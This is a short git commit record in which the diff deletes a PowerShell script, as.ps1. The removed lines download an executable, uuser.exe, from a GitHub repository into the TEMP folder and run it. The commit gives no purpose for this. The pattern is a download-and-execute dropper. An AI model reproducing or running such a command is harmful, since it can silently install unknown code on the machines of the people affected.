ca41abee732586e7e741e8d6b2173dde00e0bec8
Noplez <nopscss@gmail.com>
2025-06-05 04:55:59 +0300

    Delete as.ps1

--- as.ps1
+++
@@ -1,7 +0,0 @@
-$exeUrl = "https://github.com/Noplez/ROLE/raw/refs/heads/main/uuser.exe"
-
-$tempPath = "$env:TEMP\downloaded_file.exe"
-
-Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath
-
-Start-Process -FilePath $tempPath -Wait
